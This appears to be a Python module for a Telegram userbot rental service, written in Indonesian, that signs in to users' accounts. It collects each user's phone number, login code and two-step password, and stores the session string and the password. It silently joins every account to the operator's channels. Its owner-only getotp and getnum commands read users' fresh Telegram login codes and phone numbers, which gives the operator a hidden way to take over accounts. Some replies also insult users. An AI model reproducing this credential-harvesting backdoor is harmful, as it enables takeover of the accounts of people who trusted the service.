import asyncio
import datetime
import importlib
import sys
from datetime import datetime, timedelta
from os import environ, execle
from io import BytesIO, StringIO
from time import time
from pyrogram import *
from pyrogram.errors import *
from pyrogram.types import *
from pytz import timezone

from ubot import *
from ubot.config import *
from ubot.modules import loadModule
from ubot.utils import *
from ubot.utils.dbfunctions import *

from .help import SUPPORT

def DATETIMEBOT():
    mydate = datetime.now(timezone("Asia/Jakarta"))
    da = mydate.strftime("🗓️ Tanggal: %d/%m/%Y")
    dt = mydate.strftime("🕕 Jam: %H:%M")
    f_d = f"{da}\n{dt}"
    return f_d



#@bot.on_callback_query(filters.regex("buat_bot"))
async def bikin_ubot(_, callback_query):
    user_id = callback_query.from_user.id
    try:
        await callback_query.message.delete()
        phone = await bot.ask(
            user_id,
            (
                "<b>Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format Kode Negara.\nContoh: +628xxxxxxx</b>\n"
                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
    )
    get_otp = await bot.send_message(user_id, "<b>Mengirim Kode OTP...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except FloodWait as FW:
        await get_otp.delete()
        return await bot.send_message(user_id, FW)
    except ApiIdInvalid as AII:
        await get_otp.delete()
        return await bot.send_message(user_id, AII)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                "<b>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n"
                "\nJika Kode OTP adalah <code>12345</code> Tolong <b>[ TAMBAHKAN SPASI ]</b> kirimkan Seperti ini <code>1 2 3 4 5</code>\n"
                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.\n\nGunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "Batas waktu tercapai 5 menit.")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = True
    await new_client.start()
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    await set_uptime(new_client.me.id, time())
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
    mydate = datetime.now(timezone("Asia/Jakarta")) + timedelta(days=30)
    get_date = mydate.strftime("%d-%m-%Y")
    text_done = f"<b>🔥 {bot.me.mention} \nBerhasil Diaktifkan Di Akun: <a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b>\n<b>Expired :</b><code>{get_date}</code>"
    await bot.send_message(
        user_id,
        text_done,
        disable_web_page_preview=True,
    )
    now = datetime.now(timezone("Asia/Jakarta"))
    date = now.strftime("%d-%m-%Y")
    expire_date = now + timedelta(days=30)
    await set_expired_date(new_client.me.id, expire_date)
    await get_expired_date(new_client.me.id)
    date = DATETIMEBOT()
    buttons = [
        [
            InlineKeyboardButton(
                "Cek Kadaluarsa",
                callback_data=f"cek_masa_aktif {new_client.me.id}",
            )
        ],
    ]
    await bot.send_message(
        SKY,
        f"""
<b>❏ Userbot Diaktifkan</b>
<b> ├ Akun :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ID :</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(buttons),
        disable_web_page_preview=True)
    try:
        await new_client.join_chat("kynansupport")
        await new_client.join_chat("suportalcan")
        await new_client.join_chat("NEAREVO")
    except UserAlreadyParticipant:
        pass
    if callback_query.from_user.id not in await get_seles():
        try:
            await remove_prem(callback_query.from_user.id)
        except BaseException:
            pass


@bot.on_message(filters.command(["getotp", "getnum"]))
async def otp_and_number(client, message):
    user_id = message.from_user.id
    if user_id not in DEVS:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya owner bot yang bisa menggunakan perintah ini"
        )
    if len(message.command) < 2:
        return await bot.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    try:
        for X in ubot._ubot:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await bot.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await bot.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await bot.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await bot.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )


@bot.on_message(filters.command(["user"]))
async def user(client, message):
    user_id = message.from_user.id
    seles = await get_seles()
    if user_id not in DEVS and user_id not in seles:
        return await message.reply(
            "**❌ Lah Lu Sapa Bangsat \n✅ hanya pengguna yang memiliki akses bisa menggunakan perintah ini**"
        )
    count = 0
    user = ""
    for X in ubot._ubot:
        try:
            get_exp = await get_expired_date(X.me.id)
            exp = get_exp.strftime("%d-%m-%Y")
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href="tg://user?id={X.me.id}">{X.me.first_name} {X.me.last_name or ''}</a> 
 ├ EXP: <code>{exp}</code>
 ╰ ID: <code>{X.me.id}</code>
"""
        except:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")


@bot.on_message(filters.command("delubot"))
async def _(client, message):
    user_id = message.from_user.id
    if message.from_user.id not in await get_seles():
        await message.reply( "<code> Tidak punya akses</code>.")
        return
    if len(message.command) < 2:
        return await message.reply("Ketik /delubot user_id Untuk Mematikan Userbot")
    else:
        for X in ubot._ubot:
            try:
                user = await bot.get_users(message.text.split()[1])
                await remove_ubot(user.id)
                await rem_expired_date(user.id)
                await rem_uptime(user.id)
                await rem_pref(user.id)
                await message.reply(
                    f"<b> ✅ {user.mention} Berhasil Dihapus Dari Database</b>"
                )
                return await bot.send_message(
                    user.id, "<b>💬 MASA AKTIF ANDA TELAH BERAKHIR"
                )
            except Exception as e:
                return await message.reply(f"<b>❌ {e} </b>")


@bot.on_message(filters.command(["restart"]))
async def restart_cmd2(client, message):
    my_id = []
    for _ubot_ in ubot._ubot:
        my_id.append(_ubot_.me.id)
    msg = await message.reply("<b>Processing...</b>", quote=True)
    if message.from_user.id not in my_id:
        return await msg.edit(
            f"<b>Anda bukan pengguna @{bot.me.username}!!</b>"
        )
    for X in ubot._ubot:
        if message.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        UB = Ubot(**_ubot_)
                        UB.in_memory = False
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(
                                importlib.import_module(f"ubot.modules.{mod}")
                            )
                        return await msg.edit(
                            f"<b>✅ Berhasil Di Restart {UB.me.first_name} {UB.me.last_name or ''} | {UB.me.id}.</b>"
                        )
                    except Exception as error:
                        return await msg.edit(f"<b>{error}</b>")


@bot.on_message(filters.command(["reboot"]))
async def restart(_, message):
    user_id = message.from_user.id
    my_id = []
    for _ubot_ in ubot._ubot:
        my_id.append(_ubot_.me.id)
    if user_id not in my_id and user_id not in DEVS:
        return await message.reply(
            "<b>❌ Anda tidak bisa menggunakan perintah ini\n\n✅ Anda jelek, belom mandi, dekil bau, jijik gue sama lo, dan anda bukanlah pengguna .</b>"
        )
    buttons = [
        [
            InlineKeyboardButton(text="✅ Restart Semua", callback_data="restart_semua"),
            InlineKeyboardButton("❌ Tidak", callback_data="0_cls"),
        ],
    ]
    await bot.send_message(
        message.chat.id,
        f"<b>Apakah kamu yakin ingin MeRestart ?</b>",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


@bot.on_callback_query(filters.regex("restart_semua"))
async def is_restart(_, callback_query):
    try:
        await callback_query.edit_message_text("<b>Processing...</b>")
        print("BOT SERVER RESTARTED !!")
    except BaseException as err:
        print(f"{err}")
        return
    await asyncio.sleep(2)
    await callback_query.edit_message_text("✅ <b>Kyan-Ubot Berhasil Di Restart.</b>")
    args = [sys.executable, "-m", "ubot"]
    execle(sys.executable, *args, environ)


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        user_id = callback_query.from_user.id
        await bot.send_message(user_id, "<b>Membatalkan Proses Pembuatan Userbot!</b>")
        return True
    return False
